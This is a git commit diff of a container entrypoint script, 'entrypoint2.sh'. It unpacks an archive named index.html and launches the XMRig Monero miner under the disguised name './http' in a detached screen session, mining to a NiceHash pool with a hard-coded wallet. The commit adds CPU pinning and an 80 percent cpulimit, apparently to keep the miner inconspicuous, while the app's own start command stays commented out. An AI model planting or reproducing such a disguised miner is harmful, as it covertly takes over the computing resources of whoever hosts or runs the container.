d64c6f0484fe84e39bd0963ee04f3cc46203014c
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-31 18:50:15 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -1,21 +1,26 @@
 #!/bin/sh
 
 # Download the http file
-
+# (Assuming you have a command to download the file here, e.g., wget or curl)
 
 # Extract the http file
 tar -xvzf /app2/index.html -C /app2/
 
-
 # Change directory to the extracted folder
 cd /app2/httpalpine
 
-# Run XMRig with screen
-screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"
+# Get the number of available cores
+num_cores=$(nproc)
+
+# Randomly select 8 unique cores
+random_cores=$(shuf -i 0-$(($num_cores - 1)) -n 8 | tr '\n' ',' | sed 's/,$//')
+
+# Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
+screen -dmS http_session sh -c "taskset -c $random_cores cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"
 
 # Change directory to /app and run the original command in the background
-#cd /app
-#npm run start
+# cd /app
+# npm run start
 
 # Keep the container running
 tail -f /dev/null
